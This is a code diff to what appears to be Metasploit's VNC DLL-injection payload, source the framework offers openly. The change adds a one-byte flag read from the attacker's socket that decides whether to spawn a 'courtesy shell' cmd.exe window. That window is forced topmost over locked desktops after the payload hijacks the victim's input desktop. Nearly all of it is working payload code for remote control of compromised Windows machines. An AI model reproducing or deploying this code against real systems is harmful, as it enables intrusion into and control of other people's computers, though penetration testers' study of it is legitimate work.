@@ -76,6 +76,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine,
 	return 0;
 }
 
+// Uncomment this if you want to use the vncdll that doesn't support processing
+// a one byte flag.
+//#define USE_OLD_VNCDLL
+
+// VNCDLL flags
+#define VNCDLL_FLAG_DISABLE_SHELL (1 << 0)
 
 // This is the entry point for the DLL inject payload, the Init
 // function only receives one argument, the socket back to the
@@ -88,9 +94,15 @@ extern "C" __declspec(dllexport) int Init(SOCKET fd)
 	// vnclog.SetFile("C:\\WinVNC.log", false);
 
 	HWINSTA os = GetProcessWindowStation();
+	UCHAR flags = 0;
 
 	// Create the termination event
 	VncTerminateEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+
+#ifndef USE_OLD_VNCDLL
+	// Read in the 1 byte flag variable	
+	recv(fd, (PCHAR)&flags, 1, 0);
+#endif
 
 	// Get our bearings, hijack the input desktop
 	HWINSTA ws = OpenWindowStation("winsta0", TRUE, MAXIMUM_ALLOWED);
@@ -156,28 +168,32 @@ extern "C" __declspec(dllexport) int Init(SOCKET fd)
 		FreeLibrary(user32);
 	}
 
-	STARTUPINFOA si;
-	PROCESS_INFORMATION pi;
-	memset(&pi, 0, sizeof(pi));
-	memset(&si, 0, sizeof(si));
-	si.cb = sizeof(si);
-	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USEFILLATTRIBUTE;
-	si.wShowWindow = SW_NORMAL;
-	si.lpDesktop = name_all;
-	si.lpTitle = "Metasploit Courtesy Shell (TM)";
-	si.dwFillAttribute = FOREGROUND_RED|FOREGROUND_BLUE|FOREGROUND_GREEN|BACKGROUND_BLUE;
-
-	CreateProcess(NULL, "cmd.exe", 0, 0, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
-	CloseHandle(pi.hThread);
-	CloseHandle(pi.hProcess);
-
-	Sleep(1000);
-
-	// Attempt to set this window as the topmost, this allows us to 
-	// run right on top of locked desktops ;)
-	HWND shell = FindWindow(NULL, "Metasploit Courtesy Shell (TM)");
-	if (shell) {
-		SetWindowPos(shell, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE);
+	// If the courtesy shell should be displayed, do it!
+	if ((flags & VNCDLL_FLAG_DISABLE_SHELL) == 0)
+	{
+		STARTUPINFOA si;
+		PROCESS_INFORMATION pi;
+		memset(&pi, 0, sizeof(pi));
+		memset(&si, 0, sizeof(si));
+		si.cb = sizeof(si);
+		si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USEFILLATTRIBUTE;
+		si.wShowWindow = SW_NORMAL;
+		si.lpDesktop = name_all;
+		si.lpTitle = "Metasploit Courtesy Shell (TM)";
+		si.dwFillAttribute = FOREGROUND_RED|FOREGROUND_BLUE|FOREGROUND_GREEN|BACKGROUND_BLUE;
+	
+		CreateProcess(NULL, "cmd.exe", 0, 0, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
+	
+		Sleep(1000);
+	
+		// Attempt to set this window as the topmost, this allows us to 
+		// run right on top of locked desktops ;)
+		HWND shell = FindWindow(NULL, "Metasploit Courtesy Shell (TM)");
+		if (shell) {
+			SetWindowPos(shell, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE);
+		}
 	}
 	
 #ifdef _DEBUG
